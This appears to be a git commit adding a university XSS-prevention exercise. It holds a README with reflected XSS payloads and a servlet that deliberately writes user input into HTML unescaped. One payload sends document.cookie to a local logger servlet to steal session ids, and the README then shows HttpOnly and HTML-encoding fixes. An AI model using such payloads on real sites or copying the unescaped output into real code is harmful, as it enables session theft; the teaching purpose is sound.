62cf37c07e1f72abf65570b5ddf3728c5df889af
teiniker <egon.teiniker@fh-joanneum.at>
2017-03-10 12:08:27 +0100

    Initial import.

---
+++ web-applications/xss-prevention/Servlet-XSS-Exercise/README.txt
@@ -0,0 +1,56 @@
+Reflected Cross-Site Scripting
+---------------------------------------------------------------------
+
+Browser: https://localhost:8443/Servlet-XSS-Exercise/index.html
+		 
+
+How to attack an input field?
+---------------------------------------------------------------------
+
+a) Use FireBug to change the maxlength attribute of the input field
+	username (becuase username will be embedded in the response page).	
+
+b) Enter <script>alert('XSS');</script> as the username and submit.
+
+
+How to attack a hidden field?
+---------------------------------------------------------------------
+a) Use FireBug to change the value of the hidden field named role to:
+	<script>alert('XSS');</script>
+
+b) Fill in some more user data and submit.
+
+	
+How to Steal cookies?
+---------------------------------------------------------------------
+
+a) Deploy Servlet-Logger
+
+b) Displaying cookies
+	<script>alert(document.cookie);</script>
+
+c) Stealing cookies
+	<script>document.location="http://localhost:8080/Servlet-Logger/controller?cookie="+document.cookie+"&location="+document.location;</script>
+
+Note that this attack can also be used to steal session ids!!
+
+
+How to fix these vulnerabilities?
+---------------------------------------------------------------------
+
+o) Set the cookie flags:
+       Cookie cookie = new Cookie("id",Base64.encodeBase64String("1234567890".getBytes()));
+       cookie.setHttpOnly(true);  //!!!!
+       response.addCookie(cookie);
+
+
+o) In ControllerServlet.generateUserPage(): 
+   change
+		html.append(username).append(" as ");
+		html.append(role);
+
+   to
+		html.append(HTMLEncoder.encodeForHTML(username)).append(" as ");
+		html.append(HTMLEncoder.encodeForHTML(role));
+
+		
---
+++ web-applications/xss-prevention/Servlet-XSS-Exercise/src/main/java/org/se/lab/ControllerServlet.java
@@ -0,0 +1,80 @@
+package org.se.lab;
+
+import java.io.IOException;
+import java.io.PrintWriter;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.Cookie;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.apache.commons.codec.binary.Base64;
+
+@WebServlet("/controller")
+public class ControllerServlet extends HttpServlet
+{
+	private static final long serialVersionUID = 1L;
+
+	public ControllerServlet()
+	{
+		super();
+	}
+
+	protected void doPost(HttpServletRequest request,
+			HttpServletResponse response) throws ServletException, IOException
+	{
+		// Handling request parameters
+        String role = request.getParameter("role");
+		String username = request.getParameter("username");
+                
+        String html = generateUserPage(username, role);
+        
+        // Add cookie to the response
+        Cookie cookie = new Cookie("id",Base64.encodeBase64String("1234567890".getBytes("UTF-8")));
+        response.addCookie(cookie);
+        
+        // Generate response 
+        response.setContentType("text/html");
+        response.setBufferSize(1024);
+        PrintWriter out = response.getWriter();
+        out.println(html);
+        out.close();
+	}
+
+	
+	protected void doGet(HttpServletRequest request,
+			HttpServletResponse response) throws ServletException, IOException
+	{
+		doPost(request, response);
+	}
+	
+	
+	/*
+	 * View Helper
+	 */
+	
+	protected String generateUserPage(String username, String role)
+	{
+		StringBuilder html = new StringBuilder();
+		html.append("<html>\n");
+		html.append("    <head>\n");
+		html.append("    	<title>Cross-Site Scripting</title>\n");
+		html.append("    </head>\n");		
+		html.append("    <body>\n");
+		
+		html.append("    	<h2>Created user: ");
+		html.append(username).append(" as ");
+		html.append(role);
+		html.append("</h2>\n");
+		
+		html.append("<br>");
+		html.append("<a href=\"index.html\">back</a>");
+		
+		html.append("    </body>\n");
+		html.append("</html>\n");
+		
+		return html.toString();
+	}
+}
